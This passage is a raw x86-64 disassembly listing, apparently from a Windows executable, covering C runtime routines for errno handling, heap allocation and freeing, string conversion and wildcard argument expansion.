   140006b17:	83 f9 0e             	cmp    $0xe,%ecx
   140006b1a:	41 0f 46 c0          	cmovbe %r8d,%eax
   140006b1e:	c3                   	ret
   140006b1f:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   140006b24:	c3                   	ret
   140006b25:	cc                   	int3
   140006b26:	cc                   	int3
   140006b27:	cc                   	int3
   140006b28:	40 53                	rex push %rbx
   140006b2a:	48 83 ec 20          	sub    $0x20,%rsp
   140006b2e:	8b d9                	mov    %ecx,%ebx
   140006b30:	e8 d7 f9 ff ff       	call   0x14000650c
   140006b35:	48 85 c0             	test   %rax,%rax
   140006b38:	75 09                	jne    0x140006b43
   140006b3a:	48 8d 05 57 35 01 00 	lea    0x13557(%rip),%rax        # 0x14001a098
   140006b41:	eb 04                	jmp    0x140006b47
   140006b43:	48 83 c0 24          	add    $0x24,%rax
   140006b47:	8b cb                	mov    %ebx,%ecx
   140006b49:	89 18                	mov    %ebx,(%rax)
   140006b4b:	e8 90 ff ff ff       	call   0x140006ae0
   140006b50:	8b d8                	mov    %eax,%ebx
   140006b52:	e8 b5 f9 ff ff       	call   0x14000650c
   140006b57:	48 8d 0d 36 35 01 00 	lea    0x13536(%rip),%rcx        # 0x14001a094
   140006b5e:	48 85 c0             	test   %rax,%rax
   140006b61:	74 04                	je     0x140006b67
   140006b63:	48 8d 48 20          	lea    0x20(%rax),%rcx
   140006b67:	89 19                	mov    %ebx,(%rcx)
   140006b69:	48 83 c4 20          	add    $0x20,%rsp
   140006b6d:	5b                   	pop    %rbx
   140006b6e:	c3                   	ret
   140006b6f:	cc                   	int3
   140006b70:	40 53                	rex push %rbx
   140006b72:	48 83 ec 20          	sub    $0x20,%rsp
   140006b76:	48 8b da             	mov    %rdx,%rbx
   140006b79:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   140006b7d:	89 4a 34             	mov    %ecx,0x34(%rdx)
   140006b80:	e8 5b ff ff ff       	call   0x140006ae0
   140006b85:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140006b88:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   140006b8c:	48 83 c4 20          	add    $0x20,%rsp
   140006b90:	5b                   	pop    %rbx
   140006b91:	c3                   	ret
   140006b92:	cc                   	int3
   140006b93:	cc                   	int3
   140006b94:	48 83 ec 28          	sub    $0x28,%rsp
   140006b98:	e8 6f f9 ff ff       	call   0x14000650c
   140006b9d:	48 85 c0             	test   %rax,%rax
   140006ba0:	75 09                	jne    0x140006bab
   140006ba2:	48 8d 05 ef 34 01 00 	lea    0x134ef(%rip),%rax        # 0x14001a098
   140006ba9:	eb 04                	jmp    0x140006baf
   140006bab:	48 83 c0 24          	add    $0x24,%rax
   140006baf:	48 83 c4 28          	add    $0x28,%rsp
   140006bb3:	c3                   	ret
   140006bb4:	48 83 ec 28          	sub    $0x28,%rsp
   140006bb8:	e8 4f f9 ff ff       	call   0x14000650c
   140006bbd:	48 85 c0             	test   %rax,%rax
   140006bc0:	75 09                	jne    0x140006bcb
   140006bc2:	48 8d 05 cb 34 01 00 	lea    0x134cb(%rip),%rax        # 0x14001a094
   140006bc9:	eb 04                	jmp    0x140006bcf
   140006bcb:	48 83 c0 20          	add    $0x20,%rax
   140006bcf:	48 83 c4 28          	add    $0x28,%rsp
   140006bd3:	c3                   	ret
   140006bd4:	40 53                	rex push %rbx
   140006bd6:	48 83 ec 20          	sub    $0x20,%rsp
   140006bda:	4c 8b c2             	mov    %rdx,%r8
   140006bdd:	48 8b d9             	mov    %rcx,%rbx
   140006be0:	48 85 c9             	test   %rcx,%rcx
   140006be3:	74 0e                	je     0x140006bf3
   140006be5:	33 d2                	xor    %edx,%edx
   140006be7:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140006beb:	48 f7 f3             	div    %rbx
   140006bee:	49 3b c0             	cmp    %r8,%rax
   140006bf1:	72 43                	jb     0x140006c36
   140006bf3:	49 0f af d8          	imul   %r8,%rbx
   140006bf7:	b8 01 00 00 00       	mov    $0x1,%eax
   140006bfc:	48 85 db             	test   %rbx,%rbx
   140006bff:	48 0f 44 d8          	cmove  %rax,%rbx
   140006c03:	eb 15                	jmp    0x140006c1a
   140006c05:	e8 9e eb ff ff       	call   0x1400057a8
   140006c0a:	85 c0                	test   %eax,%eax
   140006c0c:	74 28                	je     0x140006c36
   140006c0e:	48 8b cb             	mov    %rbx,%rcx
   140006c11:	e8 ba 36 00 00       	call   0x14000a2d0
   140006c16:	85 c0                	test   %eax,%eax
   140006c18:	74 1c                	je     0x140006c36
   140006c1a:	48 8b 0d cf 4f 01 00 	mov    0x14fcf(%rip),%rcx        # 0x14001bbf0
   140006c21:	4c 8b c3             	mov    %rbx,%r8
   140006c24:	ba 08 00 00 00       	mov    $0x8,%edx
   140006c29:	ff 15 61 95 00 00    	call   *0x9561(%rip)        # 0x140010190
   140006c2f:	48 85 c0             	test   %rax,%rax
   140006c32:	74 d1                	je     0x140006c05
   140006c34:	eb 0d                	jmp    0x140006c43
   140006c36:	e8 79 ff ff ff       	call   0x140006bb4
   140006c3b:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140006c41:	33 c0                	xor    %eax,%eax
   140006c43:	48 83 c4 20          	add    $0x20,%rsp
   140006c47:	5b                   	pop    %rbx
   140006c48:	c3                   	ret
   140006c49:	cc                   	int3
   140006c4a:	cc                   	int3
   140006c4b:	cc                   	int3
   140006c4c:	48 85 c9             	test   %rcx,%rcx
   140006c4f:	74 36                	je     0x140006c87
   140006c51:	53                   	push   %rbx
   140006c52:	48 83 ec 20          	sub    $0x20,%rsp
   140006c56:	4c 8b c1             	mov    %rcx,%r8
   140006c59:	33 d2                	xor    %edx,%edx
   140006c5b:	48 8b 0d 8e 4f 01 00 	mov    0x14f8e(%rip),%rcx        # 0x14001bbf0
   140006c62:	ff 15 30 95 00 00    	call   *0x9530(%rip)        # 0x140010198
   140006c68:	85 c0                	test   %eax,%eax
   140006c6a:	75 16                	jne    0x140006c82
   140006c6c:	ff 15 66 94 00 00    	call   *0x9466(%rip)        # 0x1400100d8
   140006c72:	8b c8                	mov    %eax,%ecx
   140006c74:	e8 67 fe ff ff       	call   0x140006ae0
   140006c79:	8b d8                	mov    %eax,%ebx
   140006c7b:	e8 34 ff ff ff       	call   0x140006bb4
   140006c80:	89 18                	mov    %ebx,(%rax)
   140006c82:	48 83 c4 20          	add    $0x20,%rsp
   140006c86:	5b                   	pop    %rbx
   140006c87:	c3                   	ret
   140006c88:	48 3b ca             	cmp    %rdx,%rcx
   140006c8b:	73 04                	jae    0x140006c91
   140006c8d:	83 c8 ff             	or     $0xffffffff,%eax
   140006c90:	c3                   	ret
   140006c91:	33 c0                	xor    %eax,%eax
   140006c93:	48 3b ca             	cmp    %rdx,%rcx
   140006c96:	0f 97 c0             	seta   %al
   140006c99:	c3                   	ret
   140006c9a:	cc                   	int3
   140006c9b:	cc                   	int3
   140006c9c:	48 8b c4             	mov    %rsp,%rax
   140006c9f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006ca3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006ca7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006cab:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006caf:	41 56                	push   %r14
   140006cb1:	48 83 ec 30          	sub    $0x30,%rsp
   140006cb5:	45 33 f6             	xor    %r14d,%r14d
   140006cb8:	41 8b e9             	mov    %r9d,%ebp
   140006cbb:	48 8b da             	mov    %rdx,%rbx
   140006cbe:	48 8b f9             	mov    %rcx,%rdi
   140006cc1:	48 85 c9             	test   %rcx,%rcx
   140006cc4:	75 24                	jne    0x140006cea
   140006cc6:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   140006cca:	74 0d                	je     0x140006cd9
   140006ccc:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006cd0:	e8 77 ff ff ff       	call   0x140006c4c
   140006cd5:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006cd9:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   140006cdd:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   140006ce1:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   140006ce5:	e9 0e 01 00 00       	jmp    0x140006df8
   140006cea:	44 38 31             	cmp    %r14b,(%rcx)
   140006ced:	75 55                	jne    0x140006d44
   140006cef:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   140006cf3:	75 45                	jne    0x140006d3a
   140006cf5:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   140006cf9:	74 0d                	je     0x140006d08
   140006cfb:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006cff:	e8 48 ff ff ff       	call   0x140006c4c
   140006d04:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006d08:	b9 02 00 00 00       	mov    $0x2,%ecx
   140006d0d:	e8 96 28 00 00       	call   0x1400095a8
   140006d12:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006d16:	49 8b d6             	mov    %r14,%rdx
   140006d19:	48 f7 d8             	neg    %rax
   140006d1c:	1b c0                	sbb    %eax,%eax
   140006d1e:	f7 d0                	not    %eax
   140006d20:	83 e0 0c             	and    $0xc,%eax
   140006d23:	0f 94 c2             	sete   %dl
   140006d26:	85 c0                	test   %eax,%eax
   140006d28:	0f 94 c1             	sete   %cl
   140006d2b:	88 4b 28             	mov    %cl,0x28(%rbx)
   140006d2e:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140006d32:	85 c0                	test   %eax,%eax
   140006d34:	0f 85 c0 00 00 00    	jne    0x140006dfa
   140006d3a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006d3e:	66 44 89 30          	mov    %r14w,(%rax)
   140006d42:	eb 9d                	jmp    0x140006ce1
   140006d44:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006d48:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140006d4d:	4c 8b c7             	mov    %rdi,%r8
   140006d50:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140006d55:	8b cd                	mov    %ebp,%ecx
   140006d57:	41 8d 51 0a          	lea    0xa(%r9),%edx
   140006d5b:	e8 fc 17 00 00       	call   0x14000855c
   140006d60:	48 63 f0             	movslq %eax,%rsi
   140006d63:	85 c0                	test   %eax,%eax
   140006d65:	75 16                	jne    0x140006d7d
   140006d67:	ff 15 6b 93 00 00    	call   *0x936b(%rip)        # 0x1400100d8
   140006d6d:	8b c8                	mov    %eax,%ecx
   140006d6f:	e8 b4 fd ff ff       	call   0x140006b28
   140006d74:	e8 3b fe ff ff       	call   0x140006bb4
   140006d79:	8b 00                	mov    (%rax),%eax
   140006d7b:	eb 7d                	jmp    0x140006dfa
   140006d7d:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140006d81:	48 3b f2             	cmp    %rdx,%rsi
   140006d84:	76 41                	jbe    0x140006dc7
   140006d86:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   140006d8a:	74 0d                	je     0x140006d99
   140006d8c:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140006d90:	e8 b7 fe ff ff       	call   0x140006c4c
   140006d95:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006d99:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   140006d9d:	e8 06 28 00 00       	call   0x1400095a8
   140006da2:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006da6:	49 8b d6             	mov    %r14,%rdx
   140006da9:	48 f7 d8             	neg    %rax
   140006dac:	1b c0                	sbb    %eax,%eax
   140006dae:	f7 d0                	not    %eax
   140006db0:	83 e0 0c             	and    $0xc,%eax
   140006db3:	48 0f 44 d6          	cmove  %rsi,%rdx
   140006db7:	85 c0                	test   %eax,%eax
   140006db9:	0f 94 c1             	sete   %cl
   140006dbc:	88 4b 28             	mov    %cl,0x28(%rbx)
   140006dbf:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140006dc3:	85 c0                	test   %eax,%eax
   140006dc5:	75 33                	jne    0x140006dfa
   140006dc7:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006dcb:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006dcf:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140006dd3:	4c 8b c7             	mov    %rdi,%r8
   140006dd6:	8b cd                	mov    %ebp,%ecx
   140006dd8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006ddd:	41 8d 51 0a          	lea    0xa(%r9),%edx
   140006de1:	e8 76 17 00 00       	call   0x14000855c
   140006de6:	48 98                	cltq
   140006de8:	48 85 c0             	test   %rax,%rax
   140006deb:	0f 84 76 ff ff ff    	je     0x140006d67
   140006df1:	48 ff c8             	dec    %rax
   140006df4:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140006df8:	33 c0                	xor    %eax,%eax
   140006dfa:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006dff:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006e04:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006e09:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140006e0e:	48 83 c4 30          	add    $0x30,%rsp
   140006e12:	41 5e                	pop    %r14
   140006e14:	c3                   	ret
   140006e15:	cc                   	int3
   140006e16:	cc                   	int3
   140006e17:	cc                   	int3
   140006e18:	48 8b c4             	mov    %rsp,%rax
   140006e1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006e1f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006e23:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006e27:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006e2b:	41 56                	push   %r14
   140006e2d:	48 83 ec 40          	sub    $0x40,%rsp
   140006e31:	45 33 f6             	xor    %r14d,%r14d
   140006e34:	41 8b e9             	mov    %r9d,%ebp
   140006e37:	48 8b da             	mov    %rdx,%rbx
   140006e3a:	48 8b f9             	mov    %rcx,%rdi
   140006e3d:	48 85 c9             	test   %rcx,%rcx
   140006e40:	75 24                	jne    0x140006e66
   140006e42:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   140006e46:	74 0d                	je     0x140006e55
   140006e48:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006e4c:	e8 fb fd ff ff       	call   0x140006c4c
   140006e51:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006e55:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   140006e59:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   140006e5d:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   140006e61:	e9 20 01 00 00       	jmp    0x140006f86
   140006e66:	66 44 39 31          	cmp    %r14w,(%rcx)
   140006e6a:	75 54                	jne    0x140006ec0
   140006e6c:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   140006e70:	75 45                	jne    0x140006eb7
   140006e72:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   140006e76:	74 0d                	je     0x140006e85
   140006e78:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006e7c:	e8 cb fd ff ff       	call   0x140006c4c
   140006e81:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006e85:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006e8a:	e8 19 27 00 00       	call   0x1400095a8
   140006e8f:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006e93:	49 8b d6             	mov    %r14,%rdx
   140006e96:	48 f7 d8             	neg    %rax
   140006e99:	1b c0                	sbb    %eax,%eax
   140006e9b:	f7 d0                	not    %eax
   140006e9d:	83 e0 0c             	and    $0xc,%eax
   140006ea0:	0f 94 c2             	sete   %dl
   140006ea3:	85 c0                	test   %eax,%eax
   140006ea5:	0f 94 c1             	sete   %cl
   140006ea8:	88 4b 28             	mov    %cl,0x28(%rbx)
   140006eab:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140006eaf:	85 c0                	test   %eax,%eax
   140006eb1:	0f 85 d1 00 00 00    	jne    0x140006f88
   140006eb7:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006ebb:	44 88 30             	mov    %r14b,(%rax)
   140006ebe:	eb 9d                	jmp    0x140006e5d
   140006ec0:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006ec5:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006ec9:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140006ece:	4c 8b c7             	mov    %rdi,%r8
   140006ed1:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140006ed6:	33 d2                	xor    %edx,%edx
   140006ed8:	8b cd                	mov    %ebp,%ecx
   140006eda:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140006edf:	e8 08 17 00 00       	call   0x1400085ec
   140006ee4:	48 63 f0             	movslq %eax,%rsi
   140006ee7:	85 c0                	test   %eax,%eax
   140006ee9:	75 19                	jne    0x140006f04
   140006eeb:	ff 15 e7 91 00 00    	call   *0x91e7(%rip)        # 0x1400100d8
   140006ef1:	8b c8                	mov    %eax,%ecx
   140006ef3:	e8 30 fc ff ff       	call   0x140006b28
   140006ef8:	e8 b7 fc ff ff       	call   0x140006bb4
   140006efd:	8b 00                	mov    (%rax),%eax
   140006eff:	e9 84 00 00 00       	jmp    0x140006f88
   140006f04:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140006f08:	48 3b f2             	cmp    %rdx,%rsi
   140006f0b:	76 40                	jbe    0x140006f4d
   140006f0d:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   140006f11:	74 0d                	je     0x140006f20
   140006f13:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140006f17:	e8 30 fd ff ff       	call   0x140006c4c
   140006f1c:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140006f20:	48 8b ce             	mov    %rsi,%rcx
   140006f23:	e8 80 26 00 00       	call   0x1400095a8
   140006f28:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006f2c:	49 8b d6             	mov    %r14,%rdx
   140006f2f:	48 f7 d8             	neg    %rax
   140006f32:	1b c0                	sbb    %eax,%eax
   140006f34:	f7 d0                	not    %eax
   140006f36:	83 e0 0c             	and    $0xc,%eax
   140006f39:	48 0f 44 d6          	cmove  %rsi,%rdx
   140006f3d:	85 c0                	test   %eax,%eax
   140006f3f:	0f 94 c1             	sete   %cl
   140006f42:	88 4b 28             	mov    %cl,0x28(%rbx)
   140006f45:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140006f49:	85 c0                	test   %eax,%eax
   140006f4b:	75 3b                	jne    0x140006f88
   140006f4d:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006f51:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006f55:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006f5a:	4c 8b c7             	mov    %rdi,%r8
   140006f5d:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140006f62:	8b cd                	mov    %ebp,%ecx
   140006f64:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140006f68:	33 d2                	xor    %edx,%edx
   140006f6a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006f6f:	e8 78 16 00 00       	call   0x1400085ec
   140006f74:	48 98                	cltq
   140006f76:	48 85 c0             	test   %rax,%rax
   140006f79:	0f 84 6c ff ff ff    	je     0x140006eeb
   140006f7f:	48 ff c8             	dec    %rax
   140006f82:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140006f86:	33 c0                	xor    %eax,%eax
   140006f88:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006f8d:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006f92:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006f97:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140006f9c:	48 83 c4 40          	add    $0x40,%rsp
   140006fa0:	41 5e                	pop    %r14
   140006fa2:	c3                   	ret
   140006fa3:	cc                   	int3
   140006fa4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006fa9:	55                   	push   %rbp
   140006faa:	56                   	push   %rsi
   140006fab:	57                   	push   %rdi
   140006fac:	41 54                	push   %r12
   140006fae:	41 55                	push   %r13
   140006fb0:	41 56                	push   %r14
   140006fb2:	41 57                	push   %r15
   140006fb4:	48 8b ec             	mov    %rsp,%rbp
   140006fb7:	48 83 ec 50          	sub    $0x50,%rsp
   140006fbb:	45 33 ff             	xor    %r15d,%r15d
   140006fbe:	4c 8b ea             	mov    %rdx,%r13
   140006fc1:	48 8b d9             	mov    %rcx,%rbx
   140006fc4:	48 85 d2             	test   %rdx,%rdx
   140006fc7:	75 17                	jne    0x140006fe0
   140006fc9:	e8 e6 fb ff ff       	call   0x140006bb4
   140006fce:	41 8d 5d 16          	lea    0x16(%r13),%ebx
   140006fd2:	89 18                	mov    %ebx,(%rax)
   140006fd4:	e8 9f fa ff ff       	call   0x140006a78
   140006fd9:	8b c3                	mov    %ebx,%eax
   140006fdb:	e9 d7 01 00 00       	jmp    0x1400071b7
   140006fe0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006fe3:	4c 89 3a             	mov    %r15,(%rdx)
   140006fe6:	48 8b 01             	mov    (%rcx),%rax
   140006fe9:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   140006fee:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   140006ff2:	48 85 c0             	test   %rax,%rax
   140006ff5:	0f 84 9d 00 00 00    	je     0x140007098
   140006ffb:	48 8d 55 48          	lea    0x48(%rbp),%rdx
   140006fff:	66 c7 45 48 2a 3f    	movw   $0x3f2a,0x48(%rbp)
   140007005:	48 8b c8             	mov    %rax,%rcx
   140007008:	44 88 7d 4a          	mov    %r15b,0x4a(%rbp)
   14000700c:	e8 3f 43 00 00       	call   0x14000b350
   140007011:	48 8b 0b             	mov    (%rbx),%rcx
   140007014:	48 85 c0             	test   %rax,%rax
   140007017:	75 3c                	jne    0x140007055
   140007019:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000701d:	45 33 c0             	xor    %r8d,%r8d
   140007020:	33 d2                	xor    %edx,%edx
   140007022:	e8 c1 01 00 00       	call   0x1400071e8
   140007027:	8b f0                	mov    %eax,%esi
   140007029:	85 c0                	test   %eax,%eax
   14000702b:	74 3a                	je     0x140007067
   14000702d:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   140007031:	48 8b df             	mov    %rdi,%rbx
   140007034:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   140007038:	0f 84 dd 00 00 00    	je     0x14000711b
   14000703e:	48 8b 0b             	mov    (%rbx),%rcx
   140007041:	e8 06 fc ff ff       	call   0x140006c4c
   140007046:	48 83 c3 08          	add    $0x8,%rbx
   14000704a:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   14000704e:	75 ee                	jne    0x14000703e
   140007050:	e9 c6 00 00 00       	jmp    0x14000711b
   140007055:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140007059:	48 8b d0             	mov    %rax,%rdx
   14000705c:	e8 0b 03 00 00       	call   0x14000736c
   140007061:	8b f0                	mov    %eax,%esi
   140007063:	85 c0                	test   %eax,%eax
   140007065:	75 09                	jne    0x140007070
   140007067:	48 83 c3 08          	add    $0x8,%rbx
   14000706b:	48 8b 03             	mov    (%rbx),%rax
   14000706e:	eb 82                	jmp    0x140006ff2
   140007070:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   140007074:	48 8b df             	mov    %rdi,%rbx
   140007077:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   14000707b:	0f 84 9a 00 00 00    	je     0x14000711b
   140007081:	48 8b 0b             	mov    (%rbx),%rcx
   140007084:	e8 c3 fb ff ff       	call   0x140006c4c
   140007089:	48 83 c3 08          	add    $0x8,%rbx
   14000708d:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   140007091:	75 ee                	jne    0x140007081
   140007093:	e9 83 00 00 00       	jmp    0x14000711b
   140007098:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   14000709c:	49 83 cc ff          	or     $0xffffffffffffffff,%r12
   1400070a0:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
   1400070a4:	49 8b d7             	mov    %r15,%rdx
   1400070a7:	4c 8b f6             	mov    %rsi,%r14
   1400070aa:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   1400070ae:	4c 2b f7             	sub    %rdi,%r14
   1400070b1:	48 8b c7             	mov    %rdi,%rax
   1400070b4:	49 c1 fe 03          	sar    $0x3,%r14
   1400070b8:	49 ff c6             	inc    %r14
   1400070bb:	48 3b fe             	cmp    %rsi,%rdi
   1400070be:	74 22                	je     0x1400070e2
   1400070c0:	4c 8b 00             	mov    (%rax),%r8
   1400070c3:	49 8b cc             	mov    %r12,%rcx
   1400070c6:	48 ff c1             	inc    %rcx
   1400070c9:	45 38 3c 08          	cmp    %r15b,(%r8,%rcx,1)
   1400070cd:	75 f7                	jne    0x1400070c6
   1400070cf:	48 ff c2             	inc    %rdx
   1400070d2:	48 83 c0 08          	add    $0x8,%rax
   1400070d6:	48 03 d1             	add    %rcx,%rdx
   1400070d9:	48 3b c6             	cmp    %rsi,%rax
   1400070dc:	75 e2                	jne    0x1400070c0
   1400070de:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   1400070e2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400070e8:	49 8b ce             	mov    %r14,%rcx
   1400070eb:	e8 e8 db ff ff       	call   0x140004cd8
   1400070f0:	48 8b d8             	mov    %rax,%rbx
   1400070f3:	48 85 c0             	test   %rax,%rax
   1400070f6:	75 32                	jne    0x14000712a
   1400070f8:	33 c9                	xor    %ecx,%ecx
   1400070fa:	e8 4d fb ff ff       	call   0x140006c4c
   1400070ff:	48 8b df             	mov    %rdi,%rbx
   140007102:	48 3b fe             	cmp    %rsi,%rdi
   140007105:	74 11                	je     0x140007118
   140007107:	48 8b 0b             	mov    (%rbx),%rcx
   14000710a:	e8 3d fb ff ff       	call   0x140006c4c
   14000710f:	48 83 c3 08          	add    $0x8,%rbx
   140007113:	48 3b de             	cmp    %rsi,%rbx
   140007116:	75 ef                	jne    0x140007107
   140007118:	41 8b f4             	mov    %r12d,%esi
   14000711b:	48 8b cf             	mov    %rdi,%rcx
   14000711e:	e8 29 fb ff ff       	call   0x140006c4c
   140007123:	8b c6                	mov    %esi,%eax
   140007125:	e9 8d 00 00 00       	jmp    0x1400071b7
   14000712a:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   14000712e:	4c 8b f7             	mov    %rdi,%r14
   140007131:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   140007135:	4c 8b e1             	mov    %rcx,%r12
   140007138:	48 3b fe             	cmp    %rsi,%rdi
   14000713b:	74 4c                	je     0x140007189
   14000713d:	48 2b c7             	sub    %rdi,%rax
   140007140:	48 89 45 48          	mov    %rax,0x48(%rbp)
   140007144:	4d 8b 06             	mov    (%r14),%r8
   140007147:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   14000714b:	49 ff c7             	inc    %r15
   14000714e:	43 80 3c 38 00       	cmpb   $0x0,(%r8,%r15,1)
   140007153:	75 f6                	jne    0x14000714b
   140007155:	48 8b d1             	mov    %rcx,%rdx
   140007158:	49 ff c7             	inc    %r15
   14000715b:	49 2b d4             	sub    %r12,%rdx
   14000715e:	4d 8b cf             	mov    %r15,%r9
   140007161:	48 03 55 50          	add    0x50(%rbp),%rdx
   140007165:	49 8b cc             	mov    %r12,%rcx
   140007168:	e8 53 40 00 00       	call   0x14000b1c0
   14000716d:	85 c0                	test   %eax,%eax
   14000716f:	75 5e                	jne    0x1400071cf
   140007171:	48 8b 45 48          	mov    0x48(%rbp),%rax
   140007175:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   140007179:	4e 89 24 30          	mov    %r12,(%rax,%r14,1)
   14000717d:	4d 03 e7             	add    %r15,%r12
   140007180:	49 83 c6 08          	add    $0x8,%r14
   140007184:	4c 3b f6             	cmp    %rsi,%r14
   140007187:	75 bb                	jne    0x140007144
   140007189:	33 c9                	xor    %ecx,%ecx
   14000718b:	49 89 5d 00          	mov    %rbx,0x0(%r13)
   14000718f:	e8 b8 fa ff ff       	call   0x140006c4c
   140007194:	48 8b df             	mov    %rdi,%rbx
   140007197:	48 3b fe             	cmp    %rsi,%rdi
   14000719a:	74 11                	je     0x1400071ad
   14000719c:	48 8b 0b             	mov    (%rbx),%rcx
   14000719f:	e8 a8 fa ff ff       	call   0x140006c4c
   1400071a4:	48 83 c3 08          	add    $0x8,%rbx
   1400071a8:	48 3b de             	cmp    %rsi,%rbx
   1400071ab:	75 ef                	jne    0x14000719c
   1400071ad:	48 8b cf             	mov    %rdi,%rcx
   1400071b0:	e8 97 fa ff ff       	call   0x140006c4c
   1400071b5:	33 c0                	xor    %eax,%eax
   1400071b7:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400071be:	00 
   1400071bf:	48 83 c4 50          	add    $0x50,%rsp
   1400071c3:	41 5f                	pop    %r15
   1400071c5:	41 5e                	pop    %r14
   1400071c7:	41 5d                	pop    %r13
   1400071c9:	41 5c                	pop    %r12
   1400071cb:	5f                   	pop    %rdi
   1400071cc:	5e                   	pop    %rsi
   1400071cd:	5d                   	pop    %rbp
   1400071ce:	c3                   	ret
   1400071cf:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400071d5:	45 33 c9             	xor    %r9d,%r9d
   1400071d8:	45 33 c0             	xor    %r8d,%r8d
   1400071db:	33 d2                	xor    %edx,%edx
